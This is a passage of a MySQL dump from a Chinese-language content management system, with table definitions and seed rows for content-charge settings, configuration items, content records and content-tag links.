INSERT INTO `jc_config_content_charge` VALUES ('1', '1', '2', '3', '4', '1', '1', '1', '1', '1', '1', '0.10', '1.00', '0.0000', '0.0000', '0.0000', '0.0000', '2016-10-11 11:40:48', '5f4dcc3b5aa765d61d8327deb882cf99', '4', '0.01', '1.00', '0');

-- ----------------------------
-- Table structure for jc_config_item
-- ----------------------------
DROP TABLE IF EXISTS `jc_config_item`;
CREATE TABLE `jc_config_item` (
  `modelitem_id` int(11) NOT NULL AUTO_INCREMENT,
  `config_id` int(11) NOT NULL,
  `field` varchar(50) NOT NULL COMMENT '字段',
  `item_label` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '70' COMMENT '排列顺序',
  `def_value` varchar(255) DEFAULT NULL COMMENT '默认值',
  `opt_value` varchar(255) DEFAULT NULL COMMENT '可选项',
  `text_size` varchar(20) DEFAULT NULL COMMENT '长度',
  `area_rows` varchar(3) DEFAULT NULL COMMENT '文本行数',
  `area_cols` varchar(3) DEFAULT NULL COMMENT '文本列数',
  `help` varchar(255) DEFAULT NULL COMMENT '帮助信息',
  `help_position` varchar(1) DEFAULT NULL COMMENT '帮助位置',
  `data_type` int(11) NOT NULL DEFAULT '1' COMMENT '数据类型 "1":"字符串文本","2":"整型文本","3":"浮点型文本","4":"文本区","5":"日期","6":"下拉列表","7":"复选框","8":"单选框"',
  `is_required` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否必填',
  `category` int(11) NOT NULL DEFAULT '1' COMMENT '模型项目所属分类（1注册模型）',
  PRIMARY KEY (`modelitem_id`),
  KEY `fk_jc_item_config` (`config_id`),
  CONSTRAINT `fk_jc_item_config` FOREIGN KEY (`config_id`) REFERENCES `jc_config` (`config_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS配置模型项表';

-- ----------------------------
-- Records of jc_config_item
-- ----------------------------

-- ----------------------------
-- Table structure for jc_content
-- ----------------------------
DROP TABLE IF EXISTS `jc_content`;
CREATE TABLE `jc_content` (
  `content_id` int(11) NOT NULL AUTO_INCREMENT,
  `channel_id` int(11) NOT NULL COMMENT '栏目ID',
  `user_id` int(11) NOT NULL COMMENT '用户ID',
  `type_id` int(11) NOT NULL COMMENT '属性ID',
  `model_id` int(11) NOT NULL COMMENT '模型ID',
  `site_id` int(11) NOT NULL COMMENT '站点ID',
  `sort_date` datetime NOT NULL COMMENT '排序日期',
  `top_level` tinyint(4) NOT NULL DEFAULT '0' COMMENT '固顶级别',
  `has_title_img` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否有标题图',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推荐',
  `status` tinyint(4) NOT NULL DEFAULT '2' COMMENT '状态(0:草稿;1:审核中;2:审核通过;3:回收站;4:投稿;5:归档)',
  `views_day` int(11) NOT NULL DEFAULT '0' COMMENT '日访问数',
  `comments_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日评论数',
  `downloads_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日下载数',
  `ups_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日顶数',
  `score` int(11) NOT NULL DEFAULT '0' COMMENT '得分',
  `recommend_level` tinyint(4) NOT NULL DEFAULT '0' COMMENT '推荐级别',
  PRIMARY KEY (`content_id`),
  KEY `fk_jc_content_site` (`site_id`),
  KEY `fk_jc_content_type` (`type_id`),
  KEY `fk_jc_content_user` (`user_id`),
  KEY `fk_jc_contentchannel` (`channel_id`),
  KEY `fk_jc_content_model` (`model_id`),
  KEY `index_jc_content_top_level_sort` (`top_level`,`sort_date`),
  KEY `index_jc_content_status` (`status`),
  KEY `index_jc_content_sort_date` (`sort_date`),
  KEY `index_jc_content_is_recommend` (`is_recommend`),
  KEY `index_jc_content_recommend_level` (`recommend_level`),
  CONSTRAINT `fk_jc_content_model` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`),
  CONSTRAINT `fk_jc_content_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_content_type` FOREIGN KEY (`type_id`) REFERENCES `jc_content_type` (`type_id`),
  CONSTRAINT `fk_jc_content_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_contentchannel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB AUTO_INCREMENT=170 DEFAULT CHARSET=utf8 COMMENT='CMS内容表';

-- ----------------------------
-- Records of jc_content
-- ----------------------------
INSERT INTO `jc_content` VALUES ('2', '76', '1', '2', '5', '1', '2016-07-15 14:47:24', '0', '0', '0', '2', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content` VALUES ('7', '76', '1', '2', '5', '1', '2016-07-15 15:33:26', '0', '0', '1', '2', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content` VALUES ('11', '96', '1', '2', '1', '1', '2016-07-15 16:23:32', '0', '0', '0', '2', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content` VALUES ('12', '96', '1', '2', '1', '1', '2016-07-15 17:22:47', '0', '0', '0', '2', '0', '1', '0', '0', '1', '0');
INSERT INTO `jc_content` VALUES ('13', '76', '1', '2', '5', '1', '2016-07-19 14:12:48', '1', '0', '1', '2', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content` VALUES ('14', '96', '1', '2', '1', '1', '2016-07-19 14:26:30', '0', '0', '0', '2', '0', '0', '0', '0', '13', '0');
INSERT INTO `jc_content` VALUES ('23', '96', '1', '1', '1', '1', '2016-09-13 17:16:04', '0', '0', '0', '2', '0', '0', '0', '0', '11', '1');
INSERT INTO `jc_content` VALUES ('27', '96', '1', '2', '1', '1', '2016-09-22 16:30:13', '0', '0', '0', '2', '0', '0', '0', '0', '2', '1');
INSERT INTO `jc_content` VALUES ('28', '96', '1', '2', '1', '1', '2016-09-22 16:56:46', '0', '0', '0', '2', '0', '0', '0', '0', '2', '1');
INSERT INTO `jc_content` VALUES ('29', '96', '1', '1', '1', '1', '2016-09-23 09:07:33', '0', '0', '0', '2', '0', '0', '0', '0', '1', '1');
INSERT INTO `jc_content` VALUES ('30', '96', '1', '2', '1', '1', '2016-09-23 09:09:41', '0', '0', '0', '2', '0', '0', '0', '0', '41', '1');
INSERT INTO `jc_content` VALUES ('32', '96', '1', '2', '1', '1', '2016-09-23 09:19:38', '0', '0', '0', '2', '0', '0', '0', '0', '2', '1');
INSERT INTO `jc_content` VALUES ('33', '96', '1', '2', '1', '1', '2016-09-23 09:23:39', '0', '0', '0', '2', '0', '0', '0', '0', '18', '1');
INSERT INTO `jc_content` VALUES ('36', '96', '1', '2', '1', '1', '2016-09-23 09:40:21', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('37', '96', '1', '2', '1', '1', '2016-09-23 09:43:34', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('39', '96', '1', '2', '1', '1', '2016-09-23 09:54:17', '0', '0', '0', '2', '0', '0', '0', '0', '18', '1');
INSERT INTO `jc_content` VALUES ('53', '77', '1', '2', '6', '1', '2016-09-26 10:19:13', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('55', '77', '1', '2', '6', '1', '2016-09-26 10:20:11', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('57', '77', '1', '2', '6', '1', '2016-09-26 10:21:19', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('59', '77', '1', '2', '6', '1', '2016-09-26 10:22:24', '0', '0', '0', '3', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('61', '77', '1', '2', '6', '1', '2016-09-26 10:29:06', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('63', '77', '1', '2', '6', '1', '2016-09-26 10:30:05', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('67', '81', '1', '2', '9', '1', '2016-09-26 14:08:56', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('68', '81', '1', '2', '9', '1', '2016-09-26 14:34:34', '0', '0', '0', '2', '0', '0', '1', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('74', '81', '1', '2', '9', '1', '2016-09-29 09:28:56', '0', '0', '0', '2', '0', '0', '1', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('111', '96', '1', '2', '1', '1', '2016-10-10 11:45:47', '0', '0', '0', '2', '0', '0', '0', '0', '12', '1');
INSERT INTO `jc_content` VALUES ('112', '96', '1', '2', '1', '1', '2016-10-10 11:48:08', '0', '0', '0', '2', '0', '0', '0', '0', '18', '1');
INSERT INTO `jc_content` VALUES ('113', '96', '1', '4', '1', '1', '2016-10-10 11:50:03', '0', '0', '0', '2', '0', '0', '0', '0', '11', '1');
INSERT INTO `jc_content` VALUES ('114', '76', '1', '2', '5', '1', '2016-10-10 13:11:12', '0', '0', '1', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('115', '76', '1', '2', '5', '1', '2016-10-10 13:15:37', '0', '0', '1', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('116', '76', '1', '2', '5', '1', '2016-10-10 13:19:22', '0', '0', '1', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('117', '76', '1', '2', '5', '1', '2016-10-10 13:22:07', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('118', '76', '1', '2', '5', '1', '2016-10-10 13:23:50', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('119', '76', '1', '2', '5', '1', '2016-10-10 13:26:38', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('120', '76', '1', '2', '5', '1', '2016-10-10 13:35:17', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('121', '77', '1', '2', '6', '1', '2016-10-10 13:38:11', '1', '1', '1', '2', '1', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('122', '77', '1', '2', '6', '1', '2016-10-10 13:40:05', '0', '1', '1', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('123', '77', '1', '2', '6', '1', '2016-10-10 13:41:03', '0', '1', '1', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('124', '77', '1', '2', '6', '1', '2016-10-10 13:42:48', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('125', '77', '1', '2', '6', '1', '2016-10-10 13:44:47', '0', '0', '0', '3', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('126', '77', '1', '2', '6', '1', '2016-10-10 13:46:01', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('127', '77', '1', '2', '6', '1', '2016-10-10 13:46:26', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('128', '77', '1', '2', '6', '1', '2016-10-10 13:46:52', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('129', '77', '1', '2', '6', '1', '2016-10-10 13:47:24', '0', '0', '0', '2', '1', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('130', '96', '1', '2', '1', '1', '2016-10-10 13:51:07', '1', '0', '0', '2', '0', '0', '0', '0', '12', '1');
INSERT INTO `jc_content` VALUES ('131', '96', '1', '2', '1', '1', '2016-10-10 13:54:05', '0', '0', '0', '2', '0', '0', '0', '0', '13', '1');
INSERT INTO `jc_content` VALUES ('132', '96', '1', '2', '1', '1', '2016-10-10 13:55:46', '0', '0', '0', '2', '0', '0', '0', '0', '1', '1');
INSERT INTO `jc_content` VALUES ('133', '81', '1', '2', '9', '1', '2016-10-10 14:08:28', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('134', '81', '1', '2', '9', '1', '2016-10-10 14:11:44', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('135', '81', '1', '2', '9', '1', '2016-10-10 14:13:55', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('136', '81', '1', '2', '9', '1', '2016-10-10 14:14:59', '1', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('137', '81', '1', '2', '9', '1', '2016-10-10 14:17:16', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('138', '81', '1', '2', '9', '1', '2016-10-10 14:19:56', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('139', '81', '1', '2', '9', '1', '2016-10-10 14:24:49', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('141', '76', '1', '2', '5', '1', '2016-10-11 09:44:23', '0', '0', '0', '0', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('142', '94', '1', '2', '1', '1', '2017-01-15 23:13:58', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('143', '94', '1', '2', '1', '1', '2017-01-15 23:38:31', '0', '0', '0', '2', '2', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('144', '94', '1', '2', '1', '1', '2017-01-15 23:41:09', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('145', '94', '1', '2', '1', '1', '2017-01-15 23:41:39', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('146', '94', '1', '2', '1', '1', '2017-01-15 23:42:15', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('147', '94', '1', '2', '1', '1', '2017-01-15 23:42:42', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('148', '94', '1', '2', '1', '1', '2017-01-15 23:43:10', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('149', '94', '1', '2', '1', '1', '2017-01-15 23:43:51', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('150', '94', '1', '2', '1', '1', '2017-01-16 00:23:57', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('151', '94', '1', '2', '1', '1', '2017-01-16 00:24:48', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('152', '94', '1', '2', '1', '1', '2017-01-16 00:25:17', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('153', '94', '1', '2', '1', '1', '2017-01-16 00:25:38', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('154', '94', '1', '2', '1', '1', '2017-01-16 00:26:09', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('155', '94', '1', '2', '1', '1', '2017-01-16 00:26:45', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('156', '94', '1', '2', '1', '1', '2017-01-16 00:27:10', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('157', '94', '1', '2', '1', '1', '2017-01-16 00:27:48', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('158', '95', '1', '2', '1', '1', '2017-01-16 00:28:46', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('159', '95', '1', '2', '1', '1', '2017-01-16 00:29:10', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('160', '95', '1', '2', '1', '1', '2017-01-16 00:29:38', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('161', '95', '1', '2', '1', '1', '2017-01-16 00:30:14', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('162', '95', '1', '2', '1', '1', '2017-01-16 00:30:39', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('163', '95', '1', '2', '1', '1', '2017-01-16 00:31:10', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('164', '95', '1', '2', '1', '1', '2017-01-16 00:31:44', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('165', '95', '1', '2', '1', '1', '2017-01-16 00:32:09', '0', '0', '0', '2', '1', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('166', '95', '1', '2', '1', '1', '2017-01-16 00:32:37', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('167', '95', '1', '2', '1', '1', '2017-01-16 00:33:11', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('168', '95', '1', '2', '1', '1', '2017-01-16 00:33:38', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
INSERT INTO `jc_content` VALUES ('169', '95', '1', '2', '1', '1', '2017-01-16 00:34:14', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');

-- ----------------------------
-- Table structure for jc_contenttag
-- ----------------------------
DROP TABLE IF EXISTS `jc_contenttag`;
CREATE TABLE `jc_contenttag` (
  `content_id` int(11) NOT NULL,
  `tag_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL,
  KEY `fk_jc_content_tag` (`tag_id`),
  KEY `fk_jc_tag_content` (`content_id`),
  CONSTRAINT `fk_jc_content_tag` FOREIGN KEY (`tag_id`) REFERENCES `jc_content_tag` (`tag_id`),
  CONSTRAINT `fk_jc_tag_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容标签关联表';

-- ----------------------------
-- Records of jc_contenttag
-- ----------------------------
INSERT INTO `jc_contenttag` VALUES ('142', '1', '0');
INSERT INTO `jc_contenttag` VALUES ('142', '2', '1');
INSERT INTO `jc_contenttag` VALUES ('142', '3', '2');
INSERT INTO `jc_contenttag` VALUES ('142', '4', '3');
INSERT INTO `jc_contenttag` VALUES ('142', '5', '4');
INSERT INTO `jc_contenttag` VALUES ('142', '6', '5');
INSERT INTO `jc_contenttag` VALUES ('142', '7', '6');
INSERT INTO `jc_contenttag` VALUES ('142', '2', '7');
INSERT INTO `jc_contenttag` VALUES ('142', '3', '8');
INSERT INTO `jc_contenttag` VALUES ('142', '8', '9');
INSERT INTO `jc_contenttag` VALUES ('142', '1', '10');
INSERT INTO `jc_contenttag` VALUES ('142', '9', '11');
INSERT INTO `jc_contenttag` VALUES ('143', '10', '0');
INSERT INTO `jc_contenttag` VALUES ('143', '11', '1');
INSERT INTO `jc_contenttag` VALUES ('143', '12', '2');
INSERT INTO `jc_contenttag` VALUES ('143', '13', '3');
INSERT INTO `jc_contenttag` VALUES ('143', '14', '4');
INSERT INTO `jc_contenttag` VALUES ('143', '11', '5');
INSERT INTO `jc_contenttag` VALUES ('143', '15', '6');
INSERT INTO `jc_contenttag` VALUES ('143', '16', '7');
INSERT INTO `jc_contenttag` VALUES ('143', '17', '8');
INSERT INTO `jc_contenttag` VALUES ('143', '18', '9');
INSERT INTO `jc_contenttag` VALUES ('144', '19', '0');
INSERT INTO `jc_contenttag` VALUES ('144', '19', '1');
INSERT INTO `jc_contenttag` VALUES ('144', '20', '2');
INSERT INTO `jc_contenttag` VALUES ('144', '21', '3');
INSERT INTO `jc_contenttag` VALUES ('144', '22', '4');
INSERT INTO `jc_contenttag` VALUES ('144', '23', '5');
INSERT INTO `jc_contenttag` VALUES ('145', '24', '0');
INSERT INTO `jc_contenttag` VALUES ('145', '25', '1');
INSERT INTO `jc_contenttag` VALUES ('145', '26', '2');
INSERT INTO `jc_contenttag` VALUES ('145', '27', '3');
INSERT INTO `jc_contenttag` VALUES ('145', '28', '4');
INSERT INTO `jc_contenttag` VALUES ('145', '29', '5');
INSERT INTO `jc_contenttag` VALUES ('145', '28', '6');
INSERT INTO `jc_contenttag` VALUES ('146', '30', '0');
INSERT INTO `jc_contenttag` VALUES ('146', '31', '1');
INSERT INTO `jc_contenttag` VALUES ('146', '32', '2');
INSERT INTO `jc_contenttag` VALUES ('146', '33', '3');
INSERT INTO `jc_contenttag` VALUES ('146', '34', '4');
INSERT INTO `jc_contenttag` VALUES ('146', '35', '5');
INSERT INTO `jc_contenttag` VALUES ('146', '31', '6');
INSERT INTO `jc_contenttag` VALUES ('146', '36', '7');
INSERT INTO `jc_contenttag` VALUES ('146', '37', '8');
INSERT INTO `jc_contenttag` VALUES ('146', '38', '9');
INSERT INTO `jc_contenttag` VALUES ('147', '39', '0');
INSERT INTO `jc_contenttag` VALUES ('148', '40', '0');
INSERT INTO `jc_contenttag` VALUES ('148', '41', '1');
INSERT INTO `jc_contenttag` VALUES ('148', '42', '2');
INSERT INTO `jc_contenttag` VALUES ('148', '41', '3');
INSERT INTO `jc_contenttag` VALUES ('148', '42', '4');
INSERT INTO `jc_contenttag` VALUES ('148', '43', '5');
INSERT INTO `jc_contenttag` VALUES ('149', '44', '0');
INSERT INTO `jc_contenttag` VALUES ('149', '44', '1');
INSERT INTO `jc_contenttag` VALUES ('149', '44', '2');
INSERT INTO `jc_contenttag` VALUES ('150', '45', '0');
INSERT INTO `jc_contenttag` VALUES ('151', '46', '0');
INSERT INTO `jc_contenttag` VALUES ('151', '47', '1');
INSERT INTO `jc_contenttag` VALUES ('151', '48', '2');
INSERT INTO `jc_contenttag` VALUES ('151', '49', '3');
INSERT INTO `jc_contenttag` VALUES ('151', '49', '4');
INSERT INTO `jc_contenttag` VALUES ('151', '49', '5');
INSERT INTO `jc_contenttag` VALUES ('151', '49', '6');
INSERT INTO `jc_contenttag` VALUES ('151', '49', '7');
INSERT INTO `jc_contenttag` VALUES ('151', '49', '8');
INSERT INTO `jc_contenttag` VALUES ('152', '50', '0');
INSERT INTO `jc_contenttag` VALUES ('152', '51', '1');
INSERT INTO `jc_contenttag` VALUES ('152', '52', '2');
INSERT INTO `jc_contenttag` VALUES ('152', '31', '3');
INSERT INTO `jc_contenttag` VALUES ('152', '53', '4');
INSERT INTO `jc_contenttag` VALUES ('152', '54', '5');
INSERT INTO `jc_contenttag` VALUES ('152', '55', '6');
INSERT INTO `jc_contenttag` VALUES ('152', '31', '7');
INSERT INTO `jc_contenttag` VALUES ('152', '56', '8');
INSERT INTO `jc_contenttag` VALUES ('152', '57', '9');
INSERT INTO `jc_contenttag` VALUES ('153', '58', '0');
INSERT INTO `jc_contenttag` VALUES ('153', '31', '1');
INSERT INTO `jc_contenttag` VALUES ('153', '59', '2');
INSERT INTO `jc_contenttag` VALUES ('153', '60', '3');
INSERT INTO `jc_contenttag` VALUES ('153', '61', '4');
INSERT INTO `jc_contenttag` VALUES ('153', '46', '5');
INSERT INTO `jc_contenttag` VALUES ('154', '62', '0');
INSERT INTO `jc_contenttag` VALUES ('154', '63', '1');
INSERT INTO `jc_contenttag` VALUES ('154', '64', '2');
INSERT INTO `jc_contenttag` VALUES ('154', '65', '3');
INSERT INTO `jc_contenttag` VALUES ('154', '65', '4');
INSERT INTO `jc_contenttag` VALUES ('154', '64', '5');
INSERT INTO `jc_contenttag` VALUES ('154', '65', '6');
INSERT INTO `jc_contenttag` VALUES ('154', '65', '7');
INSERT INTO `jc_contenttag` VALUES ('154', '65', '8');
INSERT INTO `jc_contenttag` VALUES ('154', '65', '9');
INSERT INTO `jc_contenttag` VALUES ('154', '65', '10');
INSERT INTO `jc_contenttag` VALUES ('155', '66', '0');
INSERT INTO `jc_contenttag` VALUES ('155', '46', '1');
INSERT INTO `jc_contenttag` VALUES ('155', '46', '2');
INSERT INTO `jc_contenttag` VALUES ('155', '46', '3');
INSERT INTO `jc_contenttag` VALUES ('156', '67', '0');
INSERT INTO `jc_contenttag` VALUES ('156', '67', '1');
INSERT INTO `jc_contenttag` VALUES ('156', '67', '2');
INSERT INTO `jc_contenttag` VALUES ('156', '67', '3');
INSERT INTO `jc_contenttag` VALUES ('156', '67', '4');
INSERT INTO `jc_contenttag` VALUES ('156', '67', '5');
INSERT INTO `jc_contenttag` VALUES ('156', '67', '6');
INSERT INTO `jc_contenttag` VALUES ('156', '67', '7');
INSERT INTO `jc_contenttag` VALUES ('156', '67', '8');
INSERT INTO `jc_contenttag` VALUES ('156', '67', '9');
INSERT INTO `jc_contenttag` VALUES ('156', '67', '10');
INSERT INTO `jc_contenttag` VALUES ('156', '67', '11');
INSERT INTO `jc_contenttag` VALUES ('156', '67', '12');
INSERT INTO `jc_contenttag` VALUES ('156', '67', '13');
INSERT INTO `jc_contenttag` VALUES ('156', '67', '14');
INSERT INTO `jc_contenttag` VALUES ('156', '68', '15');
INSERT INTO `jc_contenttag` VALUES ('156', '67', '16');
INSERT INTO `jc_contenttag` VALUES ('157', '69', '0');
INSERT INTO `jc_contenttag` VALUES ('157', '69', '1');
INSERT INTO `jc_contenttag` VALUES ('157', '69', '2');
INSERT INTO `jc_contenttag` VALUES ('157', '69', '3');
INSERT INTO `jc_contenttag` VALUES ('157', '69', '4');
INSERT INTO `jc_contenttag` VALUES ('157', '69', '5');
INSERT INTO `jc_contenttag` VALUES ('157', '69', '6');
INSERT INTO `jc_contenttag` VALUES ('157', '69', '7');
INSERT INTO `jc_contenttag` VALUES ('157', '69', '8');
INSERT INTO `jc_contenttag` VALUES ('157', '70', '9');
INSERT INTO `jc_contenttag` VALUES ('157', '69', '10');
INSERT INTO `jc_contenttag` VALUES ('158', '31', '0');
INSERT INTO `jc_contenttag` VALUES ('158', '56', '1');
INSERT INTO `jc_contenttag` VALUES ('158', '57', '2');
INSERT INTO `jc_contenttag` VALUES ('158', '71', '3');
INSERT INTO `jc_contenttag` VALUES ('158', '72', '4');
INSERT INTO `jc_contenttag` VALUES ('158', '73', '5');
INSERT INTO `jc_contenttag` VALUES ('159', '69', '0');
INSERT INTO `jc_contenttag` VALUES ('159', '69', '1');
INSERT INTO `jc_contenttag` VALUES ('159', '69', '2');
INSERT INTO `jc_contenttag` VALUES ('159', '69', '3');
INSERT INTO `jc_contenttag` VALUES ('159', '69', '4');
INSERT INTO `jc_contenttag` VALUES ('159', '69', '5');
INSERT INTO `jc_contenttag` VALUES ('159', '69', '6');
INSERT INTO `jc_contenttag` VALUES ('159', '69', '7');
INSERT INTO `jc_contenttag` VALUES ('159', '69', '8');
INSERT INTO `jc_contenttag` VALUES ('159', '70', '9');
INSERT INTO `jc_contenttag` VALUES ('159', '69', '10');
INSERT INTO `jc_contenttag` VALUES ('160', '74', '0');
INSERT INTO `jc_contenttag` VALUES ('160', '75', '1');
INSERT INTO `jc_contenttag` VALUES ('160', '32', '2');
INSERT INTO `jc_contenttag` VALUES ('160', '33', '3');
INSERT INTO `jc_contenttag` VALUES ('160', '76', '4');
INSERT INTO `jc_contenttag` VALUES ('160', '77', '5');
INSERT INTO `jc_contenttag` VALUES ('160', '78', '6');
INSERT INTO `jc_contenttag` VALUES ('160', '79', '7');
INSERT INTO `jc_contenttag` VALUES ('160', '80', '8');
INSERT INTO `jc_contenttag` VALUES ('161', '81', '0');
INSERT INTO `jc_contenttag` VALUES ('161', '81', '1');
INSERT INTO `jc_contenttag` VALUES ('161', '81', '2');
INSERT INTO `jc_contenttag` VALUES ('161', '81', '3');
INSERT INTO `jc_contenttag` VALUES ('161', '81', '4');
INSERT INTO `jc_contenttag` VALUES ('161', '81', '5');
INSERT INTO `jc_contenttag` VALUES ('161', '81', '6');
INSERT INTO `jc_contenttag` VALUES ('162', '48', '0');
INSERT INTO `jc_contenttag` VALUES ('162', '49', '1');
INSERT INTO `jc_contenttag` VALUES ('162', '49', '2');
INSERT INTO `jc_contenttag` VALUES ('162', '49', '3');
INSERT INTO `jc_contenttag` VALUES ('162', '63', '4');
INSERT INTO `jc_contenttag` VALUES ('162', '46', '5');
INSERT INTO `jc_contenttag` VALUES ('163', '48', '0');
INSERT INTO `jc_contenttag` VALUES ('163', '49', '1');
INSERT INTO `jc_contenttag` VALUES ('163', '49', '2');
INSERT INTO `jc_contenttag` VALUES ('163', '49', '3');
INSERT INTO `jc_contenttag` VALUES ('163', '49', '4');
INSERT INTO `jc_contenttag` VALUES ('163', '48', '5');
INSERT INTO `jc_contenttag` VALUES ('163', '32', '6');
INSERT INTO `jc_contenttag` VALUES ('163', '82', '7');
INSERT INTO `jc_contenttag` VALUES ('164', '83', '0');
INSERT INTO `jc_contenttag` VALUES ('164', '83', '1');
INSERT INTO `jc_contenttag` VALUES ('164', '83', '2');
INSERT INTO `jc_contenttag` VALUES ('164', '83', '3');
INSERT INTO `jc_contenttag` VALUES ('164', '83', '4');
INSERT INTO `jc_contenttag` VALUES ('164', '83', '5');
INSERT INTO `jc_contenttag` VALUES ('164', '84', '6');
INSERT INTO `jc_contenttag` VALUES ('164', '83', '7');
INSERT INTO `jc_contenttag` VALUES ('164', '85', '8');
